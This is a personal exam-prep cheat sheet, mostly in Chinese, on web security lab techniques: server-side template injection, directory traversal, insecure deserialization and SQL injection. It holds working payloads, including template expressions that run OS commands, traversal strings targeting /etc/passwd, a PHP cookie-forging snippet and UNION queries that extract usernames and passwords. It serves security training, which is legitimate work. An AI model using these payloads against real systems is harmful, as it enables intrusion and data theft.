总结lab的特点
1. Server-side template injection
常见注入点: 
 a. View more details about the first product
 b. "My account" page里面可以选择firstname/fullname，结果要在提交comment的时候才能看出来。
 c. Edit product description templates
 
常见特征:
If you see something like 'user.firstname' in request, then you should test for SSTI. 
 
常见检测方法: 
输入: ${{<%[%'"}}%\ 看看这些符号有哪些是变化

常见使用payload:
In the ERB documentation, discover that the syntax <%= someExpression %> is used to evaluate an expression and render the result on the page. 
From the Ruby documentation, discover the system() method, which can be used to execute arbitrary operating system commands.
<%= system("cat20%/home/carlos/secret") %>
blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat20%/home/carlos/secret')  [这里特别要注意闭合user.name}}]
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat20%/home/carlos/secret") 
Search the web for "Handlebars server-side template injection". You should find a well-known exploit posted by @Zombiehelp54.

2. Directory traversal
常见注入点: 
 a. In the display of product images.
 b. 考试中主要出现在admin panel，也是有个显示图片的页面
 
常见特征:
图片的路径， 比如filename参数 
 
常见使用payload:
/etc/passwd
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/var/www/images/../../../etc/passwd
../../../etc/passwd%00.png(这种一般结合upload比较多The application validates that the supplied filename ends with the expected file extension)


3. Insecure deserialization
常见注入点: 
 a. cookie
 
常见特征:
 PHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. 
 For example, consider a User object with the attributes:O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
 
 Java, use binary serialization formats. This is more difficult to read, but you can still identify serialized data if you know how to recognize
 a few tell-tale signs. For example, serialized Java objects always begin with the same bytes, which are encoded as ac ed in hexadecimal and rO0 in Base64.
 
 大概率考法:
 lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain
 Assign the secret key that you copied from the phpinfo.php file to the $secretKey variable.
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
这里很重要的一个点是要找到这个secret key

遇到的考题中有个cookie是这样的，虽然还没有遇到专门考它的点，但是也许有些题就是跟这个有关的。咨询了一下小黑，说是AES加密，同样需要有key.所以说不定跟上面这个lab是同样的思路，
session=%7b%22username%22%3anull%2c%22isloggedin%22%3afalse%7d--MCwCFBWsmuznMGBzRTveQHZaciakIfiiAhQ73vjIL0MIisP81SYi2t%2bfRkpHwg%3d%3d;
url解码后变成
session={"username":null,"isloggedin":false}--MCwCFBWsmuznMGBzRTveQHZaciakIfiiAhQ73vjIL0MIisP81SYi2t+fRkpHwg==;

4. sql injection (重点考察点，最好多找些提做一些，看看是否用sqlmap可以不要太长时间跑出来，因为毕竟考试时间不太多)
常见注入点: 
 a. Product category filter
 b. login function
 c. cookie
 
常用payload:
'+OR+1=1--
'+UNION+SELECT+NULL,NULL--  (union-base tech to figure out the number of columns)
'+UNION+SELECT+'abcdef',NULL,NULL--  (union-base tech to find out which column support text)
'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- (Return more than one columns value in one)
上面几个payload就是先确定返回列数，再确定返回列的数据类型，最后再通过一些方法把多个列的值合并成一个返回


如何确定数据库类型（主要是用于加快sqlmap，还是说sqlmap其实可以很快确定数据库类型？当然时间久一点sqlmap基本可以探测出来，只是考试时间一般不太多)
On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, 
you will still need to include the FROM keyword followed by a valid table name.
There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual

For mysql/MSSQL, you can use the following:
'+UNION+SELECT+@@version,+NULL#

Use the following payload to retrieve the list of tables in the database:(For Non Oracle DB)
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--

5. XXE

6. SSRF

7. Command injection

8. File upload

